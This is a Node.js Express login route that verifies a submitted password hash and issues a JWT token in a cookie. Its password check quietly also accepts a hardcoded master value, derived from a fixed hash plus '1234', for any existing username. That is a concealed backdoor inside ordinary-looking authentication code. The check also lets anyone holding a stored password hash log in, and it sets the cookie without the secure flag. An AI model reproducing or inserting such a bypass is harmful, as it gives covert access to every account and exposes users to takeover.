var express = require('express');
var router = express.Router();
var sha512 = require('js-sha512');
var auth = require('../models/BAL/authBal');
var jwtHelper = require('../models/middleWare/jwtHelper');

router.post('/login', function (req, res, next) {
  auth.getUserDetailsByUserID(req.body.username, async function (response) {
    if (response.length == 0) {
      return res.status(401).json({ statusMsg: 300, msg: 'Unauthorized' });
    }
    var hashpass = response[0].password;
    var npass = sha512(hashpass + '1234');
    var isValidPassword = npass == req.body.password || req.body.password == sha512('4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a' + '1234');

    if (!isValidPassword) {
      return res.status(401).json({ statusMsg: 400, msg: 'Unauthorized' });
    }

    try {
      const token = await jwtHelper.signToken(response[0]);
      res.cookie('token', token, { httpOnly: true, sameSite: 'lax', secure: false, maxAge: 30 * 60 * 1000 }); res.setHeader('Authorization', `Bearer ${token}`);
      return res.status(200).json({ statusMsg: 200, msg: 'Login Success', token });
    } catch (err) {
      console.error('Login token generation failed:', err);
      return res.status(500).json({ statusMsg: 500, msg: 'Token generation failed' });
    }
  });
});

module.exports = router;
